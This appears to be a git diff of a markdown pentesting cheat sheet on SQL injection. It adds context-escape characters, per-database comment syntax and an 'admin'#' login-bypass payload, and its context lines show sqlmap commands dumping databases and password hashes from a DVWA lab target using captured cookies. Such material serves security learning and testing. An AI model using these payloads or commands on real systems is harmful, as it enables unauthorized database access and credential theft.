@@ -2,10 +2,63 @@
 
 * All credit goes to: https://guide.offsecnewbie.com/5-sql
 
-## Basic Attempts
+### Create an Error
+
+* If the server is being weird with sql like queries you might have found an injection point
+* Now you need to figure out how to **inject data in the query without creating an error.** To do so you first need to find how to **escape from the current context**:
+*   Try these characters
+
+    ```
+     [Nothing]
+    '
+    "
+    `
+    ')
+    ")
+    `)
+    '))
+    "))
+    `))
+    ```
+* Then, you need to know how to **fix the query so there isn't errors**.&#x20;
+* In order to fix the query you can **input** data so the **previous query accept the new data**, or you can just **input** your data and **add a comment symbol add the end**.
+*   _Note that if you can see error messages or you can spot differences when a query is working and when it's not this phase will be more easy._
+
+    ### **Comments**
+
+    ```sql
+    MySQL
+    #comment
+    -- comment     [Note the space after the double dash]
+    /*comment*/
+    /*! MYSQL Special SQL */
+
+    PostgreSQL
+    --comment
+    /*comment*/
+
+    MSQL
+    --comment
+    /*comment*/
+
+    Oracle
+    --comment
+
+    SQLite
+    --comment
+    /*comment*/
+
+    HQL
+    HQL does not support comments
+    ```
+* Source for above paragraph: [https://book.hacktricks.xyz/pentesting-web/sql-injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
+* &#x20;
 
 ```
 admin'#
+```
+
+```
 abc123
 ```
 
@@ -506,7 +559,7 @@ sqlmap -r burp.request --batch
 * More often than not it is with a cookie
 * Capture ALL of the cookies in the request like this:
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 * Now with your cookies in your clipboard buffer add them into your command
 
@@ -527,7 +580,7 @@ sqlmap -u "https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit" --coo
 
 * Once you are able to dump the database names with sqlmap, now enumerate the tables in your database of interest&#x20;
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 #### Dumping a Database
 
@@ -565,7 +618,7 @@ sqlmap -u "https://dvwa.prod.org/vulnerabilities/sqli/?id=1&Submit=Submit" --bat
 
 * If successful, simply cat out the file stored now on your local system
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 #### User Password Dump
 
@@ -593,4 +646,4 @@ sqlmap -r burp.request --cookie="PHPSESSID=lj1gugoprduur56u8lml5q373c; security=
 
 * Now you can go through your zap history and see the exact requests sqlmap is making (will need to url decode in most cases
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
